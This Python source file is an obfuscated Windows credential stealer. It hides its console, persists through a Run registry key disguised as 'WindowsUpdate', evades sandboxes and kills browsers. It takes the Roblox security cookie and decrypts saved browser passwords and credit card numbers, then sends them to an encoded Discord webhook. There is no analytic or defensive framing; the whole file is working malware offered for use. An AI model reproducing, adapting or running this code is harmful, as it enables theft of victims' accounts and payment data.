import os as _os
import sys as _sys
import base64 as _b
import ctypes as _c
import sqlite3 as _sq
import winreg as _w
import requests as _r
import platform as _p
import json as _j
import shutil as _sh
import re as _re
import subprocess as _sp
from Crypto.Cipher import AES as _A
from Crypto.Protocol.KDF import PBKDF2 as _P
from win32crypt import CryptUnprotectData as _C

# ===== HIDE CONSOLE =====
_c.windll.user32.ShowWindow(_c.windll.kernel32.GetConsoleWindow(), 0)

# ===== WEBHOOK DECRYPTION =====
WEBHOOK = _b.b85decode(
    bytes([x ^ 0x6E for x in _b.b64decode(
        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1MjA0MTk2MDUyNDc0MjgxNy83MExPWUtJZEViNU5yQzJ6eWJvUUtSZzBXZVE3VnpNdml3aVYzdjRWM0IyNUwzdXFrSERSQVc1cEk4UHQ1dEJ2NVptMw=="[::-1]
    )])
).decode()

# ===== ENHANCED OBFUSCATION =====
__x = lambda s: ''.join(chr(ord(c)^0x6E) for c in _b.b64decode(s[::-2]).decode())
__v = lambda: _re.search(__x('dmJveA=='), _p.uname().version.lower())

class _:
    def __init__(self):
        self.d = {"c":[],"$":[],"r":[]}
        try:
            with _w.OpenKey(_w.HKEY_CURRENT_USER, 
                          __x('U29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg=='), 
                          0, _w.KEY_WRITE) as k:
                _w.SetValueEx(k, __x('V2luZG93c1VwZGF0ZQ=='), 0, 
                            _w.REG_SZ, _sys.executable)
        except: pass

    def __call__(self):
        if __v() or _c.windll.kernel32.GetModuleHandleW(__x('U2JpZURsbC5kbGw=')):
            return
            
        try:
            _sp.run(__x('dGFza2tpbGwgL2YgL2ltIGNocm9tZSogL2ltIG1zZWRnZSogL2ltIGZpcmVmb3gqIC9pbSBicmF2ZSogL2ltIG9wZXJhKiAvdCA+bnVs'), 
                   shell=True, check=True)
            
            with _w.OpenKey(_w.HKEY_CURRENT_USER, 
                          __x('U29mdHdhcmVcXFJvYmxveFxcUm9ibG94U3R1ZGlvQnJvd3Nlclxccm9ibG94LmNvbQ==')) as k:
                cookie = _w.QueryValueEx(k, __x('LlJPQkxPU0VDVVJJVFk='))[0]
                self.d["r"].append(_b.b85encode(cookie.encode()).decode())
                
            for p in [__x('R29vZ2xlXENocm9tZQ=='), __x('TWljcm9zb2Z0XEVkZ2U='),
                     __x('QnJhdmVTb2Z0d2FyZVxCcmF2ZS1Ccm93c2Vy'), __x('T3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl')]:
                self._harv(_os.path.join(_os.environ['LOCALAPPDATA'], p))
            
            _r.post(WEBHOOK, 
                   files={'d': ('sys', _j.dumps(self.d))}, 
                   headers={'User-Agent': __x('TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2')},
                   timeout=15)
            
        except Exception as e:
            with open(_os.path.join(_os.environ['TEMP'], __x('ZXJyb3IubG9n')), 'a') as f:
                f.write(f"{_b.b64encode(str(e).encode()).decode()}\n")

    def _harv(self, p):
        try:
            if 'Firefox' in p:
                with open(_os.path.join(p, __x('a2V5NC5kYg==')), 'rb') as f:
                    key = _P(_C(f.read(32))[1], b'', 32)
                with open(_os.path.join(p, __x('bG9naW5zLmpzb24='))) as f:
                    for i in _j.load(f)['logins']:
                        self.d["c"].append(f"{i['hostname']}|{i['username']}|"
                                          f"{_A.new(key, _A.MODE_CBC, _b.b64decode(i['iv']))"
                                          f".decrypt(_b.b64decode(i['password'])).decode()")
            else:
                with open(_os.path.join(p, __x('TG9jYWwgU3RhdGU='))) as f:
                    k = _C(_b.b64decode(_j.load(f)['os_crypt']['encrypted_key'])[5:], 0)[1]
                for t in [__x('TG9naW4gRGF0YQ=='), __x('V2ViIERhdGE=')]:
                    try:
                        tmp = f"{_os.urandom(4).hex()}.tmp"
                        _sh.copy2(_os.path.join(p, t), tmp)
                        with _sq.connect(tmp) as c:
                            if 'Login' in t:
                                for a,b,z in c.execute('SELECT origin_url, username_value, password_value FROM logins'):
                                    self.d["c"].append(f"{a}|{b}|{_A.new(k, _A.MODE_GCM, z[3:15]).decrypt(z[15:-16]).decode()}")
                            else:
                                for n,m,y,v in c.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards'):
                                    self.d["$"].append(f"{n}|{_A.new(k, _A.MODE_GCM, v[3:15]).decrypt(v[15:-16]).decode()}|{m}/{y}")
                        _os.remove(tmp)
                    except: pass
        except: pass

if __name__ == "__main__":
    if _c.windll.shell32.IsUserAnAdmin():
        _()()
    else:
        _c.windll.shell32.ShellExecuteW(None, __x('cnVuYXM='), _sys.executable, __file__, None, 1)